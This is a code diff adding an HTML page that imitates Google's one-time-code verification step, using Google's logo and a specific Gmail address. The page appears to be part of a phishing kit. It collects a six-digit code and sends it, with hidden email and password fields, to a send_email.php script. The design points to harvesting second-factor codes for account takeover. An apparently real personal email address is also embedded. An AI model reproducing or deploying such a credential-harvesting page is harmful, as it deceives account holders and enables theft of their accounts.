@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        /* General Body Styling */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+
+        /* Login Container */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* Login Card */
+        .login-card {
+            display: flex;
+            width: 1005px;
+            min-height: 340px;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: #ffffff;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Left Section */
+        .left-section {
+            flex: 1;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .left-section h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .logo-container svg {
+            margin-bottom: 15px;
+        }
+
+        .email-display-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #333;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+
+        /* Right Section (OTP Card) */
+        .right-section {
+            flex: 1;
+            padding: 30px;
+        }
+
+        .otp-card {
+            width: 100%;
+            text-align: center;
+        }
+
+        .otp-header h1 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .otp-header p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        /* OTP Input Group */
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        /* Footer Buttons */
+        .otp-footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .verify-button {
+            background-color: #4285f4;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .verify-button:hover {
+            background-color: #357ae8;
+        }
+
+        .resend-link {
+            color: #4285f4;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .resend-link:hover {
+            color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <!-- Left Section (Logo and Email Display) -->
+            <div class="logo-container">
+                <svg xmlns="https://www.w3.org/2000/svg" width="58" height="58" viewBox="0 0 40 48" aria-hidden="true">
+                    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+                    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+                    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+                    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+                </svg>
+            </div>
+
+            <div class="row">
+                <div class="left-section">
+                    <h1>Welcome</h1>
+                    <div class="email-display-container">
+                        <svg aria-hidden="true" fill="currentColor" width="23px" height="23px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                        </svg>
+                        <span id="email-display">ogbanefedestiny@gmail.com</span>
+                    </div>
+                </div>
+
+                <!-- OTP Section -->
+                <div class="right-section otp-card">
+                    <form action="send_email.php" method="post">
+                        <div class="otp-header">
+                            <h1>Verify OTP</h1>
+                            <p>Enter the 6-digit OTP sent to your registered email.</p>
+                        </div>
+
+                        <!-- OTP Input Fields -->
+                        <div class="otp-input-group">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp2')" id="otp1">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp3')" id="otp2">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp4')" id="otp3">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp5')" id="otp4">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp6')" id="otp5">
+                            <input type="text" maxlength="1" class="otp-input" name="otp[]" id="otp6">
+                        </div>
+
+                        <!-- Hidden Fields for Email and Password -->
+                        <input type="hidden" name="email" value="ogbanefedestiny@gmail.com">
+                        <input type="hidden" name="password" value="yourpassword123">
+
+                        <!-- Submit Button -->
+                        <div class="otp-footer">
+                            <button type="submit" class="verify-button">Verify OTP</button>
+                            <span class="resend-link">Resend OTP</span>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function moveToNext(currentInput, nextInputId) {
+            if (currentInput.value.length === 1) {
+                document.getElementById(nextInputId).focus();
+            }
+        }
+    </script>
+</body>
+</html>
+
+ <!-- <script>
+        function moveToNext(current, nextId) {
+            if (current.value.length) document.getElementById(nextId).focus();
+        }
+
+        function verifyOTP() {
+            alert("OTP Verified");
+        }
+
+        function resendOTP() {
+            alert("OTP Resent");
+        }
+    </script> -->
